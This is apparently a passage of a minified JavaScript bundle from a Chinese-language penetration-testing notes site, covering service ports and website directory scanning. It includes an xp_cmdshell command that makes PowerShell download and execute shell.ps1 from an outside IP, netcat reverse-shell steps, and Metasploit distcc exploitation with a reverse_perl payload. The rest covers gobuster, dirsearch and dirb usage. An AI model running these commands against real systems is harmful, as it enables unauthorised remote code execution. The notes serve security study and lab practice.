\u6210\u529F\u4F8B\u5B50\uFF1A","				\u6700\u7EC8\uFF0C\u4F7F\u7528\u3010\u8C37\u6B4C\u4E91 \u7684 Ubuntu 16.04 LTS\u3011\uFF0C\u9ED8\u8BA4\u521D\u59CB\u5316\u914D\u7F6E\u60C5\u51B5\u4E0B\uFF0C\u8FD0\u884C\u3010nc -lvnp 443\u3011","					1.\u6B64\u65F6\uFF0CKali\u4F7F\u7528\u3010nc 104.198.9.12 443\u3011\uFF0CUbuntu\u7684\u76D1\u542C\u63A5\u6536\u5230\u4E86\u3010Connection from [120.229.65.12] port 443 [tcp/*] accepted (family 2, sport 19720)\u3011","					2.\u6709\u4E86\u8FDE\u63A5\u63D0\u793A\u540E\uFF0C\u6211\u4EEC\u53EF\u4EE5\u76F4\u63A5\u8F93\u5165\u3010\u547D\u4EE4\u811A\u672C\u3011\u4E86\u3002","						1.\u5148\u5728\u3010\u672C\u673AWin10\u3011\u6D4B\u8BD5","						2.\u518D\u5728\u3010\u9776\u673AWin Server\u3011\u6D4B\u8BD5","					3.\u6D4B\u8BD5 xp_cmdshell \u7684\u3010\u7F51\u7EDC\u8FDE\u901A\u6027\u3011\uFF1A",'						1. xp_cmdshell " ping 104.198.9.12 "',"							2. \u5982\u679C\u3010\u9776\u673A\u3011\u65E0\u6CD5\u8FDE\u63A5\u4F60\u7684\u3010\u8C37\u6B4C\u4E91\u516C\u7F51IP\u3011\uFF0C\u90A3\u5C31\u6709\u9EBB\u70E6\u4E86\u3002","						2. \u800C\u5982\u679C\u3010\u8C37\u6B4C\u4E91\u516C\u7F51IP\u3011\u65E0\u6CD5\u8FDE\u63A5\uFF0C\u90A3\u5C31\u53EA\u80FD\u3010\u5B8C\u5168\u4F9D\u8D56xp_cmdshell\u3011\u4E86\u3002","							1. \u4E3B\u8981\u5C31\u662F\u9EBB\u70E6\u70B9\u513F\u3002","			","			","		\u5173\u95ED\u6216\u653E\u5F00\u9632\u706B\u5899",e.a.createElement(e.a.Fragment,null,"			","\u3010ufw\u3011\uFF1A \uFF08",r("\u8D44\u65991","https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-with-ufw-on-ubuntu-18-04"),"\uFF09"),"				1.\u5982\u679C\u6CA1\u6709\u5B89\u88C5\uFF1A\u3010yum install ufw\u3011","				2.\u5982\u679C\u6CA1\u6709\u5F00\u542F\uFF1A","					1.\u62A5\u9519\u3010problem running\u3011","					2.\u542F\u7528\uFF1A\u3010sudo ufw enable\u3011","				3.\u5728\u89C4\u5219\u4E2D\uFF0C\u653E\u884C\u7AEF\u53E3\uFF1Aufw allow 10.10.10.27 proto tcp to any port 80,443"," ","			CentOS\u7684\u3010firewall\u3011","				1.\u67E5\u770B\u72B6\u6001\uFF1A\u3010sudo firewall-cmd --state\u3011","				2.\u5F00\u542F\uFF1A\u3010systemctl start firewalld\u3011","				3.\u5173\u95ED\uFF1A\u3010systemctl stop firewalld\u3011",e.a.createElement(e.a.Fragment,null,"		",`Win10\u7248\u672C\uFF1Axp_cmdshell " powershell 'IEX (New-Object Net.WebClient).DownloadString(\\"http://104.198.9.12/shell.ps1\\");' "`),e.a.createElement(e.a.Fragment,null,"		",'Win\u670D\u52A1\u5668\u7248\u672C\uFF1Axp_cmdshell " powershell "IEX (New-Object Net.WebClient).DownloadString(\\"http://104.198.9.12/shell.ps1\\");" "'),"			\u5982\u679C\u662F\u3010https\u534F\u8BAE\u3011\uFF0C\u5219\u53EA\u80FD\u7528\u57DF\u540D","			\u52A8\u6001\u52A0\u8F7D\u811A\u672C\uFF0C\u5E76\u6267\u884C"]}},{port:1801,name:{cn:"",fullForm:""},short:{service:"",baseUsage:""},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:3306,name:{cn:"MYSQL\u6570\u636E\u5E93",fullForm:"My Structured Query Language"},short:{service:"",baseUsage:""},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:3632,name:{cn:"Distcc\u5206\u5E03\u5F0F\u7F16\u8BD1",fullForm:"My Structured Query Language"},short:{service:"distccd",baseUsage:"\u5B83\u4EC5\u652F\u6301\u57FA\u4E8EIP\u7684\u8EAB\u4EFD\u9A8C\u8BC1\uFF0C\u9ED8\u8BA4\u60C5\u51B5\u4E0B\u5141\u8BB8\u6240\u6709\u8EAB\u4EFD\u9A8C\u8BC1\u3002"},detail:{references:[e.a.createElement(e.a.Fragment,null,"\u7AEF\u53E3\u5229\u7528\uFF1A",r("3632 - Pentesting distcc - HackTricks","https://book.hacktricks.xyz/pentesting/3632-pentesting-distcc"))],detailUsage:[],weak:["\u4E00\u822C\u6765\u8BF4\uFF0C\u9664\u4E86\u8BA9\u5176\u4ED6\u4EBA\u4F7F\u7528\u60A8\u7684\u786C\u4EF6 \u6765\u52A0\u901F\u4ED6\u4EEC\u7684\u7F16\u8BD1\u8FC7\u7A0B\u5916\uFF0C\u5B83\u6CA1\u6709\u5176\u4ED6\u5371\u5BB3\u3002"],relatedUtils:[`1.\u3010\u63A2\u6D4B\u811A\u672C\u3011nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'`,`	1.\u5982\u679C\u8BE5\u6307\u4EE4\u4E0D\u884C\uFF0C\u5219\u53EF\u4EE5\u6362\u7528\u3010nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687.nse --script-args="distcc-exec.cmd='id'" -Pn\u3011`,"2.\u3010\u6267\u884C\u653B\u51FB\u3011msf5 > use exploit/unix/misc/distcc_exec","	1.\u4F7F\u7528\u3010cmd/unix/reverse_perl\u3011\uFF0C\u4F5C\u4E3A\u3010payload\u3011\uFF0C\u662F\u76EE\u524D\u6BD4\u8F83\u597D\u4F7F\u7528\u7684"," "]}},{port:5985,name:{cn:"WinRM\u8FDC\u7A0B\u7BA1\u7406",fullForm:"Windows Remote Management"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u5141\u8BB8\u8DE8\u7F51\u7EDC\uFF0C\u8BBF\u95EE\u6216\u4EA4\u6362\uFF0C\u7BA1\u7406\u4FE1\u606F\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}}];E.checkPortPairs(s)},lpcj:function(w,U,t){"use strict";t.r(U);var z=t("/zsF"),y=t("PArb"),p=t("oBTY"),e=t("q1tI"),n=t.n(e),r=t("tMyG"),g=t("9kvl"),E=t("ysNt"),s=t("pkbI"),i=t("6r9T"),k=t("/4w9"),T=E.a.tutorial,C=T.descLinks,o=T.descTexts,W=T.genUtilUI,D=T.genLinkUI,v=E.a.singleATag_blank,x=[{keywords:"\u4E3A\u4EC0\u4E48\u5BF9\u3010bak\u5907\u4EFD\u5B58\u6863\u3011\uFF0C\u611F\u5174\u8DA3\uFF1F",desc:Object(p.a)(o(["	1.\u56E0\u4E3A PHP \u4E2D\uFF0C\u6700\u7EC8\u6E32\u67D3\u51FA\u7684\u662F\u3010HTML\u3011\u6587\u4EF6\uFF1B\u4F46\u6E90\u7801\u5374\u662F\u3010PHP\u3011\u6587\u4EF6\u3002","		1.\u6240\u4EE5\uFF0C\u3010PHP\u6E90\u7801\u3011\u5F88\u91CD\u8981\u3002","	2.\u6709\u65F6\u5019\uFF0Cwww\u4E2D\u7684\u3010PHP\u3011\u6E90\u7801\u6587\u4EF6 \u4E0D\u597D\u62FF\uFF0C\u4F46\u5176\u5B83\u3010bak\u5907\u4EFD\u5B58\u6863\u3011\u4E2D\uFF0C\u53EF\u80FD\u4F1A\u5B58\u5728\u3002","		1.\u800C\u4E00\u822C\u4E0B\uFF0C\u4EBA\u4EEC\u5BF9\u3010\u5907\u4EFD\u5B58\u6863\u3011\u7684\u654F\u611F\u6027\u9632\u8303\u7A0B\u5EA6\uFF0C\u6CA1\u90A3\u4E48\u9AD8\u3002"]))}],J=[s.a.addToBasic(i.b.server,{keywords:"\u3010\u626B\u63CF\u7F51\u7AD9\u76EE\u5F55\u3011\uFF0C\u7528\u5E38\u7528\u6587\u4EF6\u540D\u79F0\uFF0C\u8FDB\u884C\u679A\u4E3E",desc:[].concat(Object(p.a)(o(["gobuster","	\u4F18\u70B9\uFF1A","		1.\u53EF\u4EE5\u4F7F\u7528\u591A\u7EBF\u7A0B","			1.\u7ECF\u8FC7\u6D4B\u8BD5\uFF0C\u901F\u5EA6\u6781\u5FEB","		2.\u5F88\u591A\u4EBA\u63A8\u8350","	\u7F3A\u9677\uFF1A","		1.\u4E0D\u652F\u6301\u3010\u9012\u5F52\u76EE\u5F55\u3011\u6A21\u5F0F",n.a.createElement(n.a.Fragment,null,"	","\u5B89\u88C5\u65B9\u5F0F\uFF1A \uFF08",v("\u8D44\u6599","https://installlion.com/kali/kali/main/g/gobuster/install/index.html"),"\uFF09"),"		1.$ apt-get install gobuster","	\u57FA\u672C\u4F7F\u7528\uFF1A","		1.\u9700\u8981\u63D0\u524D\u51C6\u5907\u4E00\u4E2A\u3010\u679A\u4E3E\u6587\u4EF6\u3011",n.a.createElement(n.a.Fragment,null,"			","1.\u6211\u4EEC\u53EF\u4EE5\u91C7\u7528\u3010hashcat\u3011\uFF1A \uFF08",v("\u8D44\u65991","https://github.com/OJ/gobuster#wordlists-via-stdin"),"\u3001",v("\u8D44\u65992","https://blog.csdn.net/nzjdsds/article/details/86756828"),"\u3001",v("\u5B89\u88C5\u65B9\u5F0F","https://installlion.com/kali/kali/main/h/hashcat/install/index.html"),"\uFF09"),"				1.\u5B89\u88C5\u65B9\u5F0F\uFF1A$ apt-get install hashcat","				2.","			2.\u6216\u8005\uFF0C\u6211\u4EEC\u53EF\u4EE5\u91C7\u7528\u3010dirb\u3011\u5185\u7F6E\u7684\u3010\u679A\u4E3E\u6587\u4EF6\u3011\uFF1A","				1.\u3010/usr/share/dirb/wordlists/common.txt\u3011","		2.\u8981\u6CE8\u610F\u7684\u4E00\u4E9B\u7EC6\u8282\uFF1A","			1.\u663E\u793A\u7684\u7ED3\u679C\u3010/xxx\u3011\uFF0C\u662F\u57FA\u4E8E\u5F53\u524D\u3010Url\u3011\u7684\uFF1B\u5E76\u4E0D\u662F\u4E25\u683C\u610F\u4E49\u7684\u6839\u8DEF\u5F84\uFF0C\u4ECD\u662F\u76F8\u5BF9\u8DEF\u5F84\u3002","		3.\u3010dir\u3011\u6A21\u5F0F\uFF1A","			gobuster dir  -u <url\u5730\u5740>  -w <\u679A\u4E3E\u6587\u4EF6>","				1.\u57FA\u672C\u6A21\u5F0F","			gobuster dir  -u <url\u5730\u5740>  -w <\u679A\u4E3E\u6587\u4EF6>    -v  -t <\u7EBF\u7A0B\u6570\u598250>  -o <\u8F93\u51FA\u6587\u4EF6>  ","				\u3010-t\u3011\uFF0C\u66F4\u591A\u7684\u7EBF\u7A0B\u6A21\u5F0F\uFF08\u9ED8\u8BA4\u53EA\u670950\uFF09","				\u3010-v\u3011\uFF0C\u8BE6\u7EC6\u8F93\u51FA","				\u3010-o\u3011\uFF0C\u8F93\u51FA\u6587\u4EF6","				\u3010--timeout\u3011\uFF0C\u7B49\u5F85\u7684\u8FC7\u65F6\u65F6\u95F4 \uFF08\u9ED8\u8BA4\u4E3A10s\uFF09","			hashcat -a 3 --stdout ?l | gobuster dir -u <url\u5730\u5740>  -w  <\u679A\u4E3E\u6587\u4EF6>  -t <\u7EBF\u7A0B\u6570\uFF0C\u598250>","				1.\u91C7\u7528\u3010hashcat\u3011\u751F\u6210\u7684\u3010\u679A\u4E3E\u6587\u4EF6\u3011\u3002","		4.\u3010dns\u3011\u6A21\u5F0F\uFF1A","		5.\u3010vhost\u3011\u6A21\u5F0F\uFF1A"," "])),Object(p.a)(o(["dirsearch\u5DE5\u5177","	\u4F18\u70B9\uFF1A","		1.HackTheBox \u9ED8\u8BA4\u63A8\u8350\u8FD9\u4E2A","		2.\u5F53\u67E5\u770B\u8FD9\u4E2A\u5DE5\u5177\u7684\u6587\u6863\u65F6\uFF0C\u53D1\u73B0\u3010\u529F\u80FD\u53C2\u6570\u3011\u975E\u5E38\u5168\u9762","	\u5B89\u88C5\u65B9\u5F0F\uFF1A","		1.\u65E0\u6CD5\u901A\u8FC7\u3010apt-get\u3011\u5B89\u88C5","		2.\u6240\u4EE5\u8981\u901A\u8FC7GitHub\u5B89\u88C5\uFF1A","			git clone https://github.com/maurosoria/dirsearch.git","	\u4F7F\u7528\u65B9\u5F0F\uFF1A","		python3  dirsearch.py    -u  <url\u5730\u5740>    -e  <\u63D2\u4EF6\u540D \u540E\u7F00\u540D \u5982php,aspx,jsp,html,js \u7B49>    -t 50    -r  --json-report=<\u8F93\u51FA\u6587\u4EF6 \u53EF\u80FD\u8BE5\u9009\u9879\u5DF2\u7ECF\u53D8\u4E86>  --max-rate  <\u901F\u5EA6\u9891\u7387>","			\u3010-u\u3011 url\u5730\u5740","			\u3010-e\u3011 \u63D2\u4EF6\u540D\uFF0C\u591A\u4E2A\u63D2\u4EF6\u53EF\u7528csv","			\u3010-X\u3011 \u548C\u3010-e\u3011\u521A\u597D\u76F8\u53CD\uFF0C\u6307\u5B9A  \u6392\u9664\u54EA\u4E9B\u63D2\u4EF6  ","			\u3010-l\u3011 \u4F20\u5165\u3010URL\u5217\u8868\u6587\u4EF6\u3011\uFF0C\u53EF\u4EE5\u626B\u63CF\u591A\u4E2A","			\u3010-w\u3011 \u6307\u5B9A\u679A\u4E3E\u6587\u4EF6","			\u3010-r\u3011 \u5BF9\u76EE\u5F55\uFF0C\u8FDB\u884C\u3010\u8FED\u4EE3\u641C\u7D22\u3011","				1.\u8FED\u4EE3\u5BF9\u3010\u7F51\u7EDC\u5F71\u54CD\u6781\u5927\u3011\uFF0C\u614E\u7528\u3002","			\u3010-R\u3011 \u8FED\u4EE3\u6DF1\u5EA6\u3002\u5F53\u5F00\u542F\u3010-r\u3011\u65F6\uFF0C\u6307\u5B9A\u8FED\u4EE3\u7684\u5C42\u6570","			\u3010-t\u3011 \u7EBF\u7A0B\u6570\u91CF\u3002\uFF08\u9ED8\u8BA4\u4E3A30\uFF09","				1.\u6709\u65F6\u592A\u9AD8\uFF0C\u5BB9\u6613\u5F15\u53D1\u592A\u591A\u9519\u8BEF\u3002 \u6BD4\u5982 100 \u65F6\uFF0C\u9519\u8BEF\u7387\u4F1A\u975E\u5E38\u9AD8\u3002","				2.","			\u3010--json-report\u3011 \u7ED3\u679C\u8F93\u51FA\u6587\u4EF6\uFF0CJSON\u683C\u5F0F"," "])),Object(p.a)(o(["dirb\u5DE5\u5177\u626B\u63CF\u76EE\u5F55","	\u7F3A\u9677\uFF1A","		1.\uFF08\u65E0\u6CD5\u4F7F\u7528\u591A\u7EBF\u7A0B\uFF09","	\u611F\u89C9\u6BD4\u3010\u5FA1\u5251\u3011\u5F3A\u4E00\u70B9\uFF1F","	dirb  \u7F51\u7EDC\u534F\u8BAE://\u57DF\u540D:\u7AEF\u53E3  -w  -o  <\u8F93\u51FA\u6587\u4EF6>    [\u91C7\u7528\u7684\u5BC6\u7801\u5B57\u5178\u6587\u4EF6]","		\u3010-w\u3011 \u5728\u9047\u5230warning\u4FE1\u606F\u65F6\uFF0C\u4E0D\u6682\u505C","		\u3010-o\u3011 \u8F93\u51FA\u6587\u4EF6"," "])),Object(p.a)(o(["Chrome + BurpSuite\uFF0C\u67E5\u8BE2Web\u7F51\u9875\u8D44\u6E90\u76EE\u5F55","	1.Chrome\uFF1A\u3010F12\u3011\u2014\u2014\u3010Sources\u3011\u2014\u2014\u3010Page\u3011\u2014\u2014\u76EE\u5F55\u6811\u3002","	2.BurpSuite\uFF1A","		1.\u76D1\u542C\u67B6\u8BBE\u597D\uFF0C\u5E76\u76D1\u542C\u5230\u7F51\u9875\u8BF7\u6C42\u540E","		2.\u518D\u8FDB\u884C\u67E5\u770B \u3010Target\u3011\u2014\u2014\u3010Site map\u3011 \u3002","	3.\u4E24\u8005\u4E92\u8865\uFF1A","		1.\u5728\u5B9E\u8DF5\u4E2D\uFF0C\u4E24\u8005\u5404\u6709\u6240\u957F\uFF1B\u6240\u4EE5\uFF0C\u3010\u5FC5\u987B\u4E92\u8865\u3011\u624D\u80FD\u62FF\u5230\u6700\u5168\u9762\u7684\u3002","			1.\u4E24\u8005\uFF0C\u5404\u6709\u5BF9\u65B9\u62FF\u4E0D\u5230\u7684\u76EE\u5F55\u548C\u6587\u4EF6","	4.\u62D3\u5C55\u63A2\u7D22\u6A21\u5757\uFF1A","		1.\u3010\u7F51\u9875\u57FA\u672C\u529F\u80FD\u3011","		2.\u3010\u76EE\u5F55\u7ED3\u6784\u3011","		3.\u3010\u6E90\u7801\u6CE8\u91CA\u3011"," "])),Object(p.a)(o([n.a.createElement(n.a.Fragment,null,"\u5FA1\u5251\u76EE\u5F55\u626B\u63CF \uFF08",v("\u5B98\u65B9\u4ED3\u5E93","https://github.com/foryujian/yjdirscan"),"\uFF09"),"	\u5B57\u5178\u6A21\u5F0F\uFF1A","		1.\u9009\u62E9\u5B57\u5178","	Fuzz\u6A21\u5F0F\uFF1A","		1.\u4F7F\u7528\u3010\u5143\u5B57\u7B26\u3011\u968F\u673A\u7EC4\u5408\u3002","			1.\u5143\u7D20\uFF1A","				\u301026\u4E2A\u5B57\u6BCD\u3011+\u3010_\u4E0B\u5212\u7EBF\u3011","			2.\u4F4D\u6570\uFF1A","				\u3010\u5355\u8BCD\u6700\u5C0F\u4F4D\u3011+\u3010\u5355\u8BCD\u6700\u5927\u4F4D\u3011",""])),Object(p.a)(C([])))}),{keywords:"\u3010\u626B\u63CF\u672C\u5730\u6587\u672C\u3011\uFF0C\u68C0\u7D22\u5927\u91CF\u6587\u4EF6\u7684\u5185\u5BB9",desc:[].concat(Object(p.a)(o(["grep\u6307\u4EE4","	grep -r <\u76EE\u6807\u5B57\u7B26\u4E32> <\u641C\u7D22\u8DEF\u5F84>","		\u3010-r\u3011\uFF0C\u5728\u3010\u641C\u7D22\u8DEF\u5F84\u3011\u8FDB\u884C\u9012\u5F52\u67E5\u627E","	\u6210\u529F\u4F8B\u5B50\uFF1A",'		grep -r "flag is" /etc ',`
`])),Object(p.a)(C([])))}],_=function(b){var B=b.dispatch,I=b.listAndproject.list,Q=function(){B({type:"listAndproject/fetch",payload:{}})};return Object(e.useEffect)(function(){Q()},[]),n.a.createElement(r.a,{content:n.a.createElement("div",{style:{whiteSpace:"pre-line"}},`
         \u626B\u63CF\u7F51\u7AD9\u6574\u4F53\u7ED3\u6784\uFF0C\u7206\u540E\u53F0\u5730\u5740\uFF0C\u67E5\u627E\u654F\u611F\u6587\u4EF6\u7684\u6CC4\u9732\u3002

         \u3010\u7F51\u7AD9\u76EE\u5F55\u7ED3\u6784\u3011
         \u3010Admin\u7F51\u7AD9\u5165\u53E3\u3011
         \u3010Banner\u56FE\u7247\u76EE\u5F55\u3011
         \u3010\u7F51\u7AD9\u6B8B\u7559\uFF0C\u6D4B\u8BD5\u6587\u4EF6\u3011
         \u3010\u7F51\u7AD9\u6B8B\u7559\uFF0C\u5907\u4EFD\u6587\u4EF6\u3011
          `,n.a.createElement(y.a,{type:"horizontal"}),n.a.createElement("h1",null,"\u60F3\u6CD5\u601D\u8DEF"),n.a.createElement("div",null,x.map(D)),n.a.createElement(y.a,{type:"horizontal"}),n.a.createElement("h1",null,"\u5DE5\u5177"),n.a.createElement("div",null,J.map(W)))},n.a.createElement(k.a,{projectList:I}))};U.default=Object(g.c)(function(S){var b=S.listAnddirFile,B=S.listAndproject,I=S.loading;return{listAnddirFile:b,listAndproject:B,loading:I.models.listAndserver}})(_)}}]);
